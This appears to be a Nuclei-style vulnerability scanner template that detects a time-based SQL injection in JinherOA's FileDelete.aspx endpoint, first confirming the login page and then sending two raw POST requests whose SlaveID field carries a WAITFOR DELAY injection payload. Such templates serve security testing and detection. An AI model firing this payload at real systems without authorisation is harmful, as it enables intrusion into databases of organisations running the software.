id: poc-yaml-jinher-filedelete-aspx-sqli
info:
  name: "JinherOA FileDelete.aspx SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: JinherOA

flow: http(1) && http(2)

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"
        part: body

  - id: test-sqli
    raw:
      - |
        POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        SlaveID=-1')WAITFOR/**/DELAY'0:0:5'--/Temp/
      - |
        POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        SlaveID=-1')WAITFOR/**/DELAY'0:0:8'--/Temp/
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
